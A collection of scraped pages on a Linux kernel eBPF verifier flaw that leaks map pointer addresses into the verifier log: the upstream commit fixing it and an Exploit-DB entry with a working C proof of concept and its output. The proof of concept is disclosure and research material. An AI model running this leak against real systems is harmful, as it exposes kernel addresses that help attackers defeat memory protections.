=== Content from bugs.chromium.org_706eeff9_20250124_115158.html ===



=== Content from github.com_903ae039_20250124_115159.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F0d0e57697f162da4aa218b5feafe614fb666db07)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F0d0e57697f162da4aa218b5feafe614fb666db07)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=torvalds%2Flinux)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[torvalds](/torvalds)
/
**[linux](/torvalds/linux)**
Public

* [Notifications](/login?return_to=%2Ftorvalds%2Flinux) You must be signed in to change notification settings
* [Fork
  54.9k](/login?return_to=%2Ftorvalds%2Flinux)
* [Star
   186k](/login?return_to=%2Ftorvalds%2Flinux)

* [Code](/torvalds/linux)
* [Pull requests
  437](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects
  0](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

Additional navigation options

* [Code](/torvalds/linux)
* [Pull requests](/torvalds/linux/pulls)
* [Actions](/torvalds/linux/actions)
* [Projects](/torvalds/linux/projects)
* [Security](/torvalds/linux/security)
* [Insights](/torvalds/linux/pulse)

## Commit

[Permalink](/torvalds/linux/commit/0d0e57697f162da4aa218b5feafe614fb666db07)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

bpf: don't let ldimm64 leak map addresses on unprivileged

[Browse files](/torvalds/linux/tree/0d0e57697f162da4aa218b5feafe614fb666db07)
Browse the repository at this point in the history

```
The patch fixes two things at once:

1) It checks the env->allow_ptr_leaks and only prints the map address to
   the log if we have the privileges to do so, otherwise it just dumps 0
   as we would when kptr_restrict is enabled on %pK. Given the latter is
   off by default and not every distro sets it, I don't want to rely on
   this, hence the 0 by default for unprivileged.

2) Printing of ldimm64 in the verifier log is currently broken in that
   we don't print the full immediate, but only the 32 bit part of the
   first insn part for ldimm64. Thus, fix this up as well; it's okay to
   access, since we verified all ldimm64 earlier already (including just
   constants) through replace_map_fd_with_map_ptr().

Fixes: [1be7f75](https://github.com/torvalds/linux/commit/1be7f75d1668d6296b80bf35dcf6762393530afc) ("bpf: enable non-root eBPF programs")
Fixes: [cbd3570](https://github.com/torvalds/linux/commit/cbd357008604925355ae7b54a09137dabb81b580) ("bpf: verifier (add ability to receive verification log)")
Reported-by: Jann Horn <jannh@google.com>
Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>
Acked-by: Alexei Starovoitov <ast@kernel.org>
Signed-off-by: David S. Miller <davem@davemloft.net>
```

* Loading branch information

[![@borkmann](https://avatars.githubusercontent.com/u/677393?s=40&v=4)](/borkmann) [![@davem330](https://avatars.githubusercontent.com/u/1053866?s=40&v=4)](/davem330)

[borkmann](/torvalds/linux/commits?author=borkmann "View all commits by borkmann")
authored and
[davem330](/torvalds/linux/commits?author=davem330 "View all commits by davem330")
committed
May 8, 2017

1 parent
[871ff2e](/torvalds/linux/commit/871ff2ebe0af0d7f1050bfc8bce62fddea2b12ec)

commit 0d0e576

Showing
**1 changed file**
with
**16 additions**
and
**5 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

## There are no files selected for viewing

21 changes: 16 additions & 5 deletions

21
[kernel/bpf/verifier.c](#diff-edbb57adf10d1ce1fbb830a34fa92712fd01db1fbd9b6f2504001eb7bcc7b9d0 "kernel/bpf/verifier.c")

Show comments

[View file](/torvalds/linux/blob/0d0e57697f162da4aa218b5feafe614fb666db07/kernel/bpf/verifier.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -298,7 +298,8 @@ static const char \*const bpf\_jmp\_string[16] = { |
|  |  | [BPF\_EXIT >> 4] = "exit", |
|  |  | }; |
|  |  |  |
|  |  | static void print\_bpf\_insn(struct bpf\_insn \*insn) |
|  |  | static void print\_bpf\_insn(const struct bpf\_verifier\_env \*env, |
|  |  | const struct bpf\_insn \*insn) |
|  |  | { |
|  |  | u8 class = BPF\_CLASS(insn->code); |
|  |  |  |
| Expand Down  Expand Up | | @@ -362,9 +363,19 @@ static void print\_bpf\_insn(struct bpf\_insn \*insn) |
|  |  | insn->code, |
|  |  | bpf\_ldst\_string[BPF\_SIZE(insn->code) >> 3], |
|  |  | insn->src\_reg, insn->imm); |
|  |  | } else if (BPF\_MODE(insn->code) == BPF\_IMM) { |
|  |  | verbose("(%02x) r%d = 0x%x\n", |
|  |  | insn->code, insn->dst\_reg, insn->imm); |
|  |  | } else if (BPF\_MODE(insn->code) == BPF\_IMM && |
|  |  | BPF\_SIZE(insn->code) == BPF\_DW) { |
|  |  | /\* At this point, we already made sure that the second |
|  |  | \* part of the ldimm64 insn is accessible. |
|  |  | \*/ |
|  |  | u64 imm = ((u64)(insn + 1)->imm << 32) | (u32)insn->imm; |
|  |  | bool map\_ptr = insn->src\_reg == BPF\_PSEUDO\_MAP\_FD; |
|  |  |  |
|  |  | if (map\_ptr && !env->allow\_ptr\_leaks) |
|  |  | imm = 0; |
|  |  |  |
|  |  | verbose("(%02x) r%d = 0x%llx\n", insn->code, |
|  |  | insn->dst\_reg, (unsigned long long)imm); |
|  |  | } else { |
|  |  | verbose("BUG\_ld\_%02x\n", insn->code); |
|  |  | return; |
| Expand Down  Expand Up | | @@ -2853,7 +2864,7 @@ static int do\_check(struct bpf\_verifier\_env \*env) |
|  |  |  |
|  |  | if (log\_level) { |
|  |  | verbose("%d: ", insn\_idx); |
|  |  | print\_bpf\_insn(insn); |
|  |  | print\_bpf\_insn(env, insn); |
|  |  | } |
|  |  |  |
|  |  | err = ext\_analyzer\_insn\_hook(env, insn\_idx, prev\_insn\_idx); |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `0d0e576`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftorvalds%2Flinux%2Fcommit%2F0d0e57697f162da4aa218b5feafe614fb666db07) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from git.kernel.org_1a3b6083_20250124_115158.html ===


| [cgit logo](/) | [index](/) : [kernel/git/torvalds/linux.git](/pub/scm/linux/kernel/git/torvalds/linux.git/) | for-next master |
| --- | --- | --- |
| Linux kernel source tree | Linus Torvalds |

| [about](/pub/scm/linux/kernel/git/torvalds/linux.git/about/)[summary](/pub/scm/linux/kernel/git/torvalds/linux.git/)[refs](/pub/scm/linux/kernel/git/torvalds/linux.git/refs/?id=0d0e57697f162da4aa218b5feafe614fb666db07)[log](/pub/scm/linux/kernel/git/torvalds/linux.git/log/)[tree](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=0d0e57697f162da4aa218b5feafe614fb666db07)[commit](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0d0e57697f162da4aa218b5feafe614fb666db07)[diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=0d0e57697f162da4aa218b5feafe614fb666db07)[stats](/pub/scm/linux/kernel/git/torvalds/linux.git/stats/) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Daniel Borkmann <daniel@iogearbox.net> | 2017-05-08 00:04:09 +0200 |
| --- | --- | --- |
| committer | David S. Miller <davem@davemloft.net> | 2017-05-08 15:06:46 -0400 |
| commit | [0d0e57697f162da4aa218b5feafe614fb666db07](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=0d0e57697f162da4aa218b5feafe614fb666db07) ([patch](/pub/scm/linux/kernel/git/torvalds/linux.git/patch/?id=0d0e57697f162da4aa218b5feafe614fb666db07)) | |
| tree | [454f20b91ec0c397d87ed016308a9d8da292980b](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/?id=0d0e57697f162da4aa218b5feafe614fb666db07) | |
| parent | [871ff2ebe0af0d7f1050bfc8bce62fddea2b12ec](/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=871ff2ebe0af0d7f1050bfc8bce62fddea2b12ec) ([diff](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=0d0e57697f162da4aa218b5feafe614fb666db07&id2=871ff2ebe0af0d7f1050bfc8bce62fddea2b12ec)) | |
| download | [linux-0d0e57697f162da4aa218b5feafe614fb666db07.tar.gz](/pub/scm/linux/kernel/git/torvalds/linux.git/snapshot/linux-0d0e57697f162da4aa218b5feafe614fb666db07.tar.gz) | |

bpf: don't let ldimm64 leak map addresses on unprivilegedThe patch fixes two things at once:
1) It checks the env->allow\_ptr\_leaks and only prints the map address to
the log if we have the privileges to do so, otherwise it just dumps 0
as we would when kptr\_restrict is enabled on %pK. Given the latter is
off by default and not every distro sets it, I don't want to rely on
this, hence the 0 by default for unprivileged.
2) Printing of ldimm64 in the verifier log is currently broken in that
we don't print the full immediate, but only the 32 bit part of the
first insn part for ldimm64. Thus, fix this up as well; it's okay to
access, since we verified all ldimm64 earlier already (including just
constants) through replace\_map\_fd\_with\_map\_ptr().
Fixes: 1be7f75d1668 ("bpf: enable non-root eBPF programs")
Fixes: cbd357008604 ("bpf: verifier (add ability to receive verification log)")
Reported-by: Jann Horn <jannh@google.com>
Signed-off-by: Daniel Borkmann <daniel@iogearbox.net>
Acked-by: Alexei Starovoitov <ast@kernel.org>
Signed-off-by: David S. Miller <davem@davemloft.net>
[Diffstat](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/?id=0d0e57697f162da4aa218b5feafe614fb666db07)

| -rw-r--r-- | [kernel/bpf/verifier.c](/pub/scm/linux/kernel/git/torvalds/linux.git/diff/kernel/bpf/verifier.c?id=0d0e57697f162da4aa218b5feafe614fb666db07) | 21 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 16 insertions, 5 deletions

| diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.cindex c2ff608c1984ed..c5b56c92f8e255 100644--- a/[kernel/bpf/verifier.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/bpf/verifier.c?id=871ff2ebe0af0d7f1050bfc8bce62fddea2b12ec)+++ b/[kernel/bpf/verifier.c](/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/bpf/verifier.c?id=0d0e57697f162da4aa218b5feafe614fb666db07)@@ -298,7 +298,8 @@ static const char \*const bpf\_jmp\_string[16] = { [BPF\_EXIT >> 4] = "exit", }; -static void print\_bpf\_insn(struct bpf\_insn \*insn)+static void print\_bpf\_insn(const struct bpf\_verifier\_env \*env,+ const struct bpf\_insn \*insn) { u8 class = BPF\_CLASS(insn->code); @@ -362,9 +363,19 @@ static void print\_bpf\_insn(struct bpf\_insn \*insn) insn->code, bpf\_ldst\_string[BPF\_SIZE(insn->code) >> 3], insn->src\_reg, insn->imm);- } else if (BPF\_MODE(insn->code) == BPF\_IMM) {- verbose("(%02x) r%d = 0x%x\n",- insn->code, insn->dst\_reg, insn->imm);+ } else if (BPF\_MODE(insn->code) == BPF\_IMM &&+ BPF\_SIZE(insn->code) == BPF\_DW) {+ /\* At this point, we already made sure that the second+ \* part of the ldimm64 insn is accessible.+ \*/+ u64 imm = ((u64)(insn + 1)->imm << 32) | (u32)insn->imm;+ bool map\_ptr = insn->src\_reg == BPF\_PSEUDO\_MAP\_FD;++ if (map\_ptr && !env->allow\_ptr\_leaks)+ imm = 0;++ verbose("(%02x) r%d = 0x%llx\n", insn->code,+ insn->dst\_reg, (unsigned long long)imm); } else { verbose("BUG\_ld\_%02x\n", insn->code); return;@@ -2853,7 +2864,7 @@ static int do\_check(struct bpf\_verifier\_env \*env)  if (log\_level) { verbose("%d: ", insn\_idx);- print\_bpf\_insn(insn);+ print\_bpf\_insn(env, insn); }  err = ext\_analyzer\_insn\_hook(env, insn\_idx, prev\_insn\_idx); |
| --- |

generated by [cgit 1.2.3-korg](https://git.zx2c4.com/cgit/about/) ([git 2.43.0](https://git-scm.com/)) at 2025-01-24 10:57:44 +0000



=== Content from www.exploit-db.com_22cbfd14_20250124_115203.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Linux Kernel 4.11 - eBPF Verifier Log Leaks Lower Half of map Pointer

#### EDB-ID:

###### 42048

#### CVE:

###### [2017-9150](https://nvd.nist.gov/vuln/detail/CVE-2017-9150)

---

**EDB Verified:**

#### Author:

###### [Google Security Research](/?author=7725)

#### Type:

###### [dos](/?type=dos)

---

#### Platform:

###### [Linux](/?platform=linux)

#### Date:

###### 2017-05-22

---

**Vulnerable App:**

```
/*
Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1251

When the eBPF verifier (kernel/bpf/verifier.c) runs in verbose mode,
it dumps all processed instructions to a user-accessible buffer in
human-readable form using print_bpf_insn(). For instructions with
class BPF_LD and mode BPF_IMM, it prints the raw 32-bit value:

  } else if (class == BPF_LD) {
    if (BPF_MODE(insn->code) == BPF_ABS) {
      [...]
    } else if (BPF_MODE(insn->code) == BPF_IND) {
      [...]
    } else if (BPF_MODE(insn->code) == BPF_IMM) {
      verbose("(%02x) r%d = 0x%x\n",
              insn->code, insn->dst_reg, insn->imm);
    } else {
      [...]
    }
  } else if (class == BPF_JMP) {

This is done in do_check(), after replace_map_fd_with_map_ptr() has
executed. replace_map_fd_with_map_ptr() stores the lower half of a raw
pointer in all instructions with class BPF_LD, mode BPF_IMM and size
BPF_DW (map references).

So when verbose verification is performed on a program with a map
reference, the lower half of the pointer to the map becomes visible to
the user:

$ cat bpf_pointer_leak_poc.c
*/

#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/bpf.h>
#include <err.h>
#include <stdio.h>
#include <stdint.h>

#define BPF_LD_IMM64_RAW(DST, SRC, IMM)         \
  ((struct bpf_insn) {                          \
    .code  = BPF_LD | BPF_DW | BPF_IMM,         \
    .dst_reg = DST,                             \
    .src_reg = SRC,                             \
    .off   = 0,                                 \
    .imm   = (__u32) (IMM) }),                  \
  ((struct bpf_insn) {                          \
    .code  = 0, /* zero is reserved opcode */   \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
  BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_MOV64_IMM(DST, IMM)                 \
  ((struct bpf_insn) {                          \
    .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
    .dst_reg = DST,                             \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = IMM })
#define BPF_EXIT_INSN()                         \
  ((struct bpf_insn) {                          \
    .code  = BPF_JMP | BPF_EXIT,                \
    .dst_reg = 0,                               \
    .src_reg = 0,                               \
    .off   = 0,                                 \
    .imm   = 0 })

#define ARRSIZE(x) (sizeof(x) / sizeof((x)[0]))

int bpf_(int cmd, union bpf_attr *attrs) {
  return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

int main(void) {
  union bpf_attr create_map_attrs = {
    .map_type = BPF_MAP_TYPE_ARRAY,
    .key_size = 4,
    .value_size = 1,
    .max_entries = 1
  };
  int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
  if (mapfd == -1)
    err(1, "map create");

  struct bpf_insn insns[] = {
    BPF_LD_MAP_FD(BPF_REG_0, mapfd),
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN()
  };
  char verifier_log[10000];
  union bpf_attr create_prog_attrs = {
    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
    .insn_cnt = ARRSIZE(insns),
    .insns = (uint64_t)insns,
    .license = (uint64_t)"",
    .log_level = 1,
    .log_size = sizeof(verifier_log),
    .log_buf = (uint64_t)verifier_log
  };
  int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
  if (progfd == -1)
    err(1, "prog load");

  puts(verifier_log);
}

/*
$ gcc -o bpf_pointer_leak_poc bpf_pointer_leak_poc.c -Wall -std=gnu99 -I~/linux/usr/include
$ ./bpf_pointer_leak_poc
0: (18) r0 = 0xd9da1c80
2: (b7) r0 = 0
3: (95) exit
processed 3 insns

Tested with kernel 4.11.
*/

```

**Tags:**

**Advisory/Source:**
[Link](https://bugs.chromium.org/p/project-zero/issues/detail?id=1251)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from source.android.com_dfb8c0dc_20250124_115201.html ===


[![Android Open Source Project](https://www.gstatic.com/devrel-devsite/prod/vda41147226ae308b24384f785d31d739107d2716272d99cd11c490ff3892954d/androidsource/images/lockup.svg)](/)

`/`

* English
* Deutsch
* Español
* Español – América Latina
* Français
* Indonesia
* Italiano
* Polski
* Português
* Português – Brasil
* Tiếng Việt
* Türkçe
* Русский
* עברית
* العربيّة
* فارسی
* हिंदी
* বাংলা
* ภาษาไทย
* 中文 – 简体
* 中文 – 繁體
* 日本語
* 한국어

[Android Code Search](https://cs.android.com/android/platform/superproject/main)
Sign in

* [Documentation](https://source.android.com/docs)

[What's New?](https://source.android.com/docs/whatsnew)

[Getting Started](https://source.android.com/docs/setup)

[Security](https://source.android.com/docs/security)

[Core Topics](https://source.android.com/docs/core)

[Compatibility](https://source.android.com/docs/compatibility)

[Android Devices](https://source.android.com/docs/devices)

[Automotive](https://source.android.com/docs/automotive)

[Reference](https://source.android.com/reference)

[![Android Open Source Project](https://www.gstatic.com/devrel-devsite/prod/vda41147226ae308b24384f785d31d739107d2716272d99cd11c490ff3892954d/androidsource/images/lockup.svg)](/)

* [Docs](/docs)
  + More
  + [What's New?](/docs/whatsnew)
  + [Getting Started](/docs/setup)
  + [Security](/docs/security)
